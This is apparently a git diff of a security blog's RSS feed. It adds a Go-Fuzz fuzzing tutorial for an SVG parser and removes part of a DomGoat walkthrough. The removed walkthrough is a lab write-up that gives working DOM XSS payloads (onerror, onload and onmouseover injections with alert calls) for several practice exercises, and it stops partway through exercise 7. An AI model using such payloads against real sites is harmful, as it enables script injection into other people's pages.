@@ -6,8 +6,8 @@
 </description>
     <link>http://snoopysecurity.github.io/</link>
     <atom:link href="http://snoopysecurity.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 26 Dec 2021 19:28:51 +0000</pubDate>
-    <lastBuildDate>Sun, 26 Dec 2021 19:28:51 +0000</lastBuildDate>
+    <pubDate>Sun, 26 Dec 2021 19:33:36 +0000</pubDate>
+    <lastBuildDate>Sun, 26 Dec 2021 19:33:36 +0000</lastBuildDate>
     <generator>Jekyll v3.2.1</generator>
     
       <item>
@@ -384,6 +384,179 @@ Upgrade-Insecure-Requests: 1
         
         
         <category>web-application-security</category>
+        
+      </item>
+    
+      <item>
+        <title>Fuzzing with Go-Fuzz</title>
+        <description>&lt;p&gt;Fuzzing can often be a very useful technical for finding bugs. Go-fuzz is a coverage-guided fuzzing solution for testing of Go packages. &lt;a href=&quot;https://github.com/dvyukov/go-fuzz&quot;&gt;go-fuzz&lt;/a&gt;. This blog post will walk you through how to use it to find bugs.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;1) Installing Go&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;On linux, Go can be quickly installed by the following commands.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cd /tmp
+$ ls
+$ curl -OL https://golang.org/dl/go1.15.12.linux-amd64.tar.gz
+$ sudo tar -C /usr/local -xvf go1.15.12.linux-amd64.tar.gz
+$ go version
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;2) &lt;strong&gt;Choosing a target&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Some easy ways to find a target for fuzzing can be&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://pkg.go.dev/&lt;/li&gt;
+  &lt;li&gt;https://github.com/trending/go&lt;/li&gt;
+  &lt;li&gt;https://github.com/avelino/awesome-go&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;For this example, we will fuzz &lt;a href=&quot;https://github.com/JoshVarga/svgparser&quot;&gt;https://github.com/JoshVarga/svgparser&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;3) &lt;strong&gt;Building pdf package for fuzzing&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Go-fuzz can be installed by running the following commands&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;go get -u github.com/dvyukov/go-fuzz/go-fuzz
+go get -u github.com/dvyukov/go-fuzz/go-fuzz-build
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This installs the latest version of go-fuzz onto your go path&lt;/p&gt;
+
+&lt;p&gt;The svg target we are fuzzing can be installed by &lt;code class=&quot;highlighter-rouge&quot;&gt;go get -u github.com/JoshVarga/svgparser&lt;/code&gt; which will install the svg reader onto your go path as well.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/home/snoopy/gowork/src/github.com/JoshVarga/svgparser
+❯ ls
+ example_test.go   find.go   find_test.go   fuzz.go   LICENSE   parser.go   parser_test.go   README.md   testutils_test.go   utils
+❯ 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This will install the svg package we are fuzzing in our go path, you can now go to this directory and create a new file call &lt;code class=&quot;highlighter-rouge&quot;&gt;fuzz.go&lt;/code&gt; which will contain your harness.&lt;/p&gt;
+
+&lt;p&gt;Within Svgparser, we will try to fuzz the &lt;code class=&quot;highlighter-rouge&quot;&gt;Parse&lt;/code&gt; function&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/gofuzz/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/JoshVarga/svgparser/blob/5eaba627a7d11a384dde3802ac251442e14d87ef/parser.go#L121&quot;&gt;https://github.com/JoshVarga/svgparser/blob/5eaba627a7d11a384dde3802ac251442e14d87ef/parser.go#L121&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;To fuzz this function, we can create a fuzz function harness for go-fuzz with the same package name. (Note: your fuzz.go file should be on the same folder as the function you are fuzzing). This function must return 1 if the fuzzer should increase priority of the given input during subsequent fuzzing (for example, the input is lexically correct and was parsed successfully); -1 if the input must not be added to corpus even if gives new coverage; and 0 otherwise; other values are reserved for future use. The Fuzz function must be in a package that go-fuzz can import. This means the code you want to test can’t be in package main. Fuzzing internal packages are also supported.&lt;/p&gt;
+
+&lt;p&gt;An examples fuzz function for fuzzing can be seen below (which is saved within &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/snoopy/gowork/src/github.com/JoshVarga/svgparser&lt;/code&gt;)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package svgparser
+
+import (
+	&quot;bytes&quot;
+)
+
+func Fuzz(data []byte) int {
+
+	element,err := Parse(bytes.NewReader(data), false)
+	if err != nil {
+		if element != nil {
+			panic(&quot;svg != nil on error&quot;)
+		}
+		return 0
+	}
+
+	return 1
+
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;This implements &lt;code class=&quot;highlighter-rouge&quot;&gt;Fuzz(data []byte)&lt;/code&gt; function, which is an API expected by go-fuzz. once this has been done, you can go back to your working directory and use &lt;code class=&quot;highlighter-rouge&quot;&gt;go-fuzz-build&lt;/code&gt; to build the archive which &lt;code class=&quot;highlighter-rouge&quot;&gt;go-fuzz&lt;/code&gt; will use.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ pwd
+/home/snoopy/svg_fuzz
+❯ go-fuzz-build github.com/JoshVarga/svgparser
+ ✗ ls
+  svgparser-fuzz.zip
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;which will produce svgparser-fuzz.zip archive.&lt;/p&gt;
+
+&lt;p&gt;3) &lt;strong&gt;Building a corpus&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;The next step is to build a corpus for gofuzz to use which will be placed within your working directory. Ideally, files in the corpus are as small as possible and as diverse as possible. You can use inputs used by unit tests, examples and/or generate them manually. Go-fuzz by default will deduplicate and minimize the inputs&lt;/p&gt;
+
+&lt;p&gt;Go-fuzz will also add own inputs to the corpus directory. Furthermore, the go-fuzz-corpus repository contains a bunch of examples of test functions and initial input corpuses for various packages. &lt;a href=&quot;https://github.com/dvyukov/go-fuzz-corpus&quot;&gt;https://github.com/dvyukov/go-fuzz-corpus&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;In this instance, example svg files can be taken from &lt;a href=&quot;https://github.com/strongcourage/fuzzing-corpus&quot;&gt;https://github.com/strongcourage/fuzzing-corpus&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Another option would be to create an example svg file and use &lt;a href=&quot;https://gitlab.com/akihe/radamsa&quot;&gt;radamsa&lt;/a&gt; to mutate the files to create some examples. Gofuzz will also mutate the files given and create more files for your corpus&lt;/p&gt;
+
+&lt;p&gt;These files can be taken and copied to a folder called corpus within you fuzzing directory.&lt;/p&gt;
+
+&lt;p&gt;3) &lt;strong&gt;Fuzzing&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;going back to your working directory, you can now start gofuzz: &lt;code class=&quot;highlighter-rouge&quot;&gt;go-fuzz -bin=svgparser-fuzz.zip -workdir=.&lt;/code&gt; The working directory here should contain a folder corpus with all the svg files your previous found.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/gofuzz/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As long as you don’t delete working directory, you can stop and re-start go-fuzz and it will restart where it stopped. Found crashes will be logged in crashers directory.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;*workers means number of tests running in parallel (set with -procs flag).&lt;/li&gt;
+  &lt;li&gt;corpus is current number of interesting inputs the fuzzer has discovered, time in brackets says when the last interesting input was discovered&lt;/li&gt;
+  &lt;li&gt;crashers is number of discovered bugs (check out workdir/crashers dir).&lt;/li&gt;
+  &lt;li&gt;restarts is the rate with which the fuzzer restarts test processes.&lt;/li&gt;
+  &lt;li&gt;cover is number of bits set in a hashed coverage bitmap&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;4) &lt;strong&gt;Triaging Crashes&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;For any unique crashes, these will be logged within your &lt;code class=&quot;highlighter-rouge&quot;&gt;crashers&lt;/code&gt; directory.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ cd crashers/
+❯ ls
+ 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7          4465097c05a30de5b06942b3f02e4e196276ae49          88ffb7f7327afe041ac722aaccc9b248b1a12524          c5f797d236f6199102cc91083335469aac76cece
+ 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7.output   4465097c05a30de5b06942b3f02e4e196276ae49.output   88ffb7f7327afe041ac722aaccc9b248b1a12524.output   c5f797d236f6199102cc91083335469aac76cece.output
+ 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7.quoted
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;These will be the format, fuzz input which is the input used to fuzz the file, the .quoted file contains the input quoted as a string and the .output file contains the crash dump&lt;/p&gt;
+
+&lt;p&gt;Example:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ cat 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7
+&amp;lt;svg xmlns=&quot;htt00000000000000000000000&quot;&amp;gt;00&amp;lt;/svg&amp;gt;0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ cat 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7.quoted 
+	&quot;&amp;lt;svg xmlns=\&quot;htt00000&quot; +
+	&quot;000000000000000000\&quot;&amp;gt;&quot; +
+	&quot;00&amp;lt;/svg&amp;gt;0&quot;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ cat 0106e07494ad508ca0ec6e32d0ae9ac7bb932de7.output 
+SVG width: panic: runtime error: index out of range [0] with length 0
+
+goroutine 1 [running]:
+github.com/JoshVarga/svgparser.Fuzz(0x7f4ee8b8f000, 0x31, 0x31, 0x4)
+	/home/snoopy/gowork/src/github.com/JoshVarga/svgparser/fuzz.go:21 +0x346
+go-fuzz-dep.Main(0xc000057f70, 0x1, 0x1)
+	go-fuzz-dep/main.go:36 +0x1b8
+main.main()
+	github.com/JoshVarga/svgparser/go.fuzz.main/main.go:15 +0x52
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;This can then be triaged.&lt;/p&gt;
+</description>
+        <pubDate>Sat, 09 Jan 2021 09:00:00 +0000</pubDate>
+        <link>http://snoopysecurity.github.io/software-security/2021/01/09/09_fuzzing-wit-go-fuzz.html</link>
+        <guid isPermaLink="true">http://snoopysecurity.github.io/software-security/2021/01/09/09_fuzzing-wit-go-fuzz.html</guid>
+        
+        
+        <category>software-security</category>
         
       </item>
     
@@ -2900,367 +3073,6 @@ When the &lt;code class=&quot;highlighter-rouge&quot;&gt;extract()&lt;/code&gt; 
         
         
         <category>application-security</category>
-        
-      </item>
-    
-      <item>
-        <title>DomGoat Walkthrough</title>
-        <description>&lt;p&gt;DOM-based Cross site Scripting (XSS) is a type of XSS where user input is written to a web pages’ Document Object Model without proper sanitization. This could be abused by an attacker to manipulate this data to include malicious JavaScript code.&lt;/p&gt;
-
-&lt;p&gt;Domgoat has 10 exercises of Dom XSS. Some examples where user input come from are &lt;code class=&quot;highlighter-rouge&quot;&gt;location.href&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;document.URL&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;document.baseURI&lt;/code&gt; etc leading to a sink function such as &lt;code class=&quot;highlighter-rouge&quot;&gt;document.write&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;document.writeln&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;innerHTML&lt;/code&gt; etc.&lt;/p&gt;
-
-&lt;p&gt;A detailed explanation of DOM sources can be found here: &lt;a href=&quot;https://domgo.at/cxss/sources/somevalue?param1=paramvalue#hashvalue&quot;&gt;Client XSS Sources&lt;/a&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;URL-based DOM Property Sources - &lt;code class=&quot;highlighter-rouge&quot;&gt;location.href&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;document.URL&lt;/code&gt; etc&lt;/li&gt;
-  &lt;li&gt;Navigation-based DOM Property Sources - &lt;code class=&quot;highlighter-rouge&quot;&gt;window.name&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;document.referrer&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Communication based Sources - &lt;code class=&quot;highlighter-rouge&quot;&gt;Window Messaging&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;WebSocket&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Storage-based Sources - &lt;code class=&quot;highlighter-rouge&quot;&gt;SessionStorage&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;LocalStorage&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;A detailed explanation of DOM sinks can be found here: &lt;a href=&quot;https://domgo.at/cxss/sinks&quot;&gt;Client XSS Sinks&lt;/a&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Sinks that execute payload as JavaScript - &lt;code class=&quot;highlighter-rouge&quot;&gt;eval&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;setTimeout&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;setInterval&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Sinks that evaluate JavaScript URIs - &lt;code class=&quot;highlighter-rouge&quot;&gt;location&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;location.href&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;location.assign&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;Sinks that execute payload as HTML - &lt;code class=&quot;highlighter-rouge&quot;&gt;innerHTML&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;outerHTML&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;document.write&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;document.writeln&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;This blog will share solutions for &lt;a href=&quot;https://domgo.at/cxss/intro&quot;&gt;DomGoat&lt;/a&gt;, a DOM XSS challenge bed.&lt;/p&gt;
-
-&lt;h3 id=&quot;exercise---1&quot;&gt;Exercise - 1&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    let hash = location.hash;
-    if (hash.length &amp;gt; 1) {
-        let hashValueToUse = unescape(hash.substr(1));
-        let msg = &quot;Welcome &amp;lt;b&amp;gt;&quot; + hashValueToUse + &quot;&amp;lt;/b&amp;gt;!!&quot;;
-        document.getElementById(&quot;msgboard&quot;).innerHTML = msg;
-    }
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;The source where user input is flowing from is &lt;code class=&quot;highlighter-rouge&quot;&gt;location.hash&lt;/code&gt; and the sink where user input ends up is &lt;code class=&quot;highlighter-rouge&quot;&gt;HTMLElement.innerHTML&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;object/onerror=alert(document.domain)&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://domgo.at/cxss/example/1?payload=abcd&amp;amp;sp=x#%3Cobject/onerror=alert(document.domain)%3E
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/domgoat/xss1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;exercise---2&quot;&gt;Exercise - 2&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    let rfr = document.referrer;
-    let paramValue = unescape(getPayloadParamValueFromUrl(rfr));
-    if (paramValue.length &amp;gt; 0) {
-        let msg = &quot;Welcome &amp;lt;b&amp;gt;&quot; + paramValue + &quot;&amp;lt;/b&amp;gt;!!&quot;;
-        document.getElementById(&quot;msgboard&quot;).innerHTML = msg;
-    } else {
-        document.getElementById(&quot;msgboard&quot;).innerHTML = &quot;Parameter named &amp;lt;b&amp;gt;payload&amp;lt;/b&amp;gt; was not found in the referrer.&quot;;
-    }
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The source where user input is flowing from is &lt;code class=&quot;highlighter-rouge&quot;&gt;document.referrer&lt;/code&gt; and the sink where user input ends up is &lt;code class=&quot;highlighter-rouge&quot;&gt;HTMLElement.innerHTML&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Looking at the above JavaScript code, the &lt;code class=&quot;highlighter-rouge&quot;&gt;document.referrer&lt;/code&gt; is sent the the &lt;code class=&quot;highlighter-rouge&quot;&gt;getPayloadParamValueFromUrl&lt;/code&gt; function.&lt;/p&gt;
-
-&lt;p&gt;This function is looking for a parameter called &lt;code class=&quot;highlighter-rouge&quot;&gt;payload&lt;/code&gt; is returning that to the &lt;code class=&quot;highlighter-rouge&quot;&gt;msg&lt;/code&gt; variable which is then given to &lt;code class=&quot;highlighter-rouge&quot;&gt;innerHTML&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-
-let getPayloadParamValueFromUrl = function (url) {
-let paramName = &quot;payload=&quot;;
-if (url.indexOf(paramName) &amp;gt; -1) { //check for value payload
-    let part = url.substr(rfr.indexOf(paramName));
-    part = part.split(paramName)[1]; //extract payload parameter value
-    if (part.indexOf(&quot;#&quot;) &amp;gt; -1) {  //check for hash sign within the value
-        part = part.split(&quot;#&quot;)[0]; 	//extract the hash value
-        
-    }
-    part = part.split(&quot;&amp;amp;&quot;)[0];
-		document.write(part.split(&quot;&amp;amp;&quot;)[0]);
-    return part;
-}
-return &quot;&quot;;
-};
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The same payload from Exercise 1 can be used. Here Exercise 1 page is first visited.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://domgo.at/cxss/example/1?payload=abcd%3Cobject/onerror=alert(window.location.pathname)%3E&amp;amp;sp=x#11
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The Exercise 2 page can now be visited to execute XSS.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/domgoat/xss2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;exercise---3&quot;&gt;Exercise - 3&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    let responseBody = xhr.responseText;
-    let responeBodyObject = JSON.parse(responseBody);
-    let msg = &quot;Welcome &amp;lt;b&amp;gt;&quot; + responeBodyObject.payload + &quot;&amp;lt;/b&amp;gt;!!&quot;;
-    document.getElementById(&quot;msgboard&quot;).innerHTML = msg;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The source where user input is flowing from is &lt;code class=&quot;highlighter-rouge&quot;&gt;xhr.responseText;&lt;/code&gt; and the sink where user input ends up is &lt;code class=&quot;highlighter-rouge&quot;&gt;HTMLElement.innerHTML&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Here a input form is provided to insert some user input, this is then sent to the following endpoint&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        xhr.open(&quot;GET&quot;, '/data.json?payload=' + escape(payload), true);
-        xhr.send();
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;This is then returned &lt;code class=&quot;highlighter-rouge&quot;&gt;innerHTML&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;A payload such as the following can be inserted into the payload box.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe/onload=alert(window.location.pathname)&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/domgoat/xss3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;exercise---4&quot;&gt;Exercise - 4&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    let ws = new WebSocket(webSocketUrl);
-    ws.onmessage = function (evt) {
-        
-        let rawMsg = evt.data;
-        let msgJson = JSON.parse(rawMsg);
-        let msg = &quot;Welcome &amp;lt;b&amp;gt;&quot; + msgJson.payload + &quot;&amp;lt;/b&amp;gt;!!&quot;;
-        document.getElementById(&quot;msgboard&quot;).innerHTML = msg;
-    };
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The source where user input is flowing from is &lt;code class=&quot;highlighter-rouge&quot;&gt;ws.onmessage&lt;/code&gt; and the sink where user input ends up is &lt;code class=&quot;highlighter-rouge&quot;&gt;HTMLElement.innerHTML&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Looking at the HTML source, user input from the &lt;code class=&quot;highlighter-rouge&quot;&gt;payloadbox&lt;/code&gt; input form is sent to a &lt;code class=&quot;highlighter-rouge&quot;&gt;/ws&lt;/code&gt; endpoint&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      let payload = document.getElementById('payloadbox').value;
-        ws.send(payload);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;This is then returned to HTML.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe/onload=alert(window.location.pathname)&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/domgoat/xss4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;exercise---5&quot;&gt;Exercise - 5&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    window.onmessage = function (evt) {
-        let msgObj = evt.data;
-        let msg = &quot;Welcome &amp;lt;b&amp;gt;&quot; + msgObj.payload + &quot;&amp;lt;/b&amp;gt;!!&quot;;
-        document.getElementById(&quot;msgboard&quot;).innerHTML = msg;
-    };
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;The source where user input is flowing from is &lt;code class=&quot;highlighter-rouge&quot;&gt;postMessage&lt;/code&gt; and the sink where user input ends up is &lt;code class=&quot;highlighter-rouge&quot;&gt;HTMLElement.innerHTML&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;In the below code, the &lt;code class=&quot;highlighter-rouge&quot;&gt;window.postMessage()&lt;/code&gt; method is used to send a request to a window object and this data is printed back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;msgboard&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   window.onload = function () {
-        processPayload();
-    };
-
-    let processPayload = function () {
-
-        let payload = document.getElementById('payloadbox').value;
-        frames[0].postMessage(payload, location.origin);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The following can be inserted to the &lt;code class=&quot;highlighter-rouge&quot;&gt;payloadbox&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe/onload=alert(window.location.pathname)&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/domgoat/xss5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;exercise---6&quot;&gt;Exercise - 6&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    let payloadValue = localStorage.getItem(&quot;payload&quot;, payload);
-    let msg = &quot;Welcome &quot; + payload + &quot;!!&quot;;
-    document.getElementById(&quot;msgboard&quot;).innerHTML = msg;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The source where user input is flowing from is &lt;code class=&quot;highlighter-rouge&quot;&gt;localStorage.getItem&lt;/code&gt; and the sink where user input ends up is &lt;code class=&quot;highlighter-rouge&quot;&gt;HTMLElement.innerHTML&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Any user input inserted into the payloadbox is stored within the browser’s local storage.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   let processPayload = function () {
-        let payload = document.getElementById('payloadbox').value;
-        localStorage.setItem(&quot;payload&quot;, payload);
-        readPayload();
-    };
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/domgoat/xss6-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;This is then reflected back in a user’s page.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;svg/onload=alert(window.location.pathname)&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/domgoat/xss6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;exercise---7&quot;&gt;Exercise - 7&lt;/h3&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    let hash = location.hash;
-    let hashValueToUse = hash.length &amp;gt; 1 ? unescape(hash.substr(1)) : hash;
-    hashValueToUse = hashValueToUse.replace(/&amp;lt;/g, &quot;&amp;amp;lt;&quot;).replace(/&amp;gt;/g, &quot;&amp;amp;gt;&quot;);
-    let msg = &quot;&amp;lt;a href='#user=&quot; + hashValueToUse + &quot;'&amp;gt;Welcome&amp;lt;/a&amp;gt;!!&quot;;
-    document.getElementById(&quot;msgboard&quot;).innerHTML = msg;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;The source where user input is flowing from is &lt;code class=&quot;highlighter-rouge&quot;&gt;location.hash&lt;/code&gt; and the sink where user input ends up is &lt;code class=&quot;highlighter-rouge&quot;&gt;HTMLElement.innerHTML&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;The user input here is concentated as part of a href link &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;a href='#user=&quot; + hashValueToUse + &quot;'&amp;gt;Welcome&amp;lt;/a&amp;gt;&lt;/code&gt;. In is possible to break out of this attribute context using another JavaScript event handler.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#' onmouseover=alert(window.location.pathname)//
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://domgo.at/cxss/example/7#%23%27%20onmouseover%3Dalert(window.location.pathname)%2F%2F
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
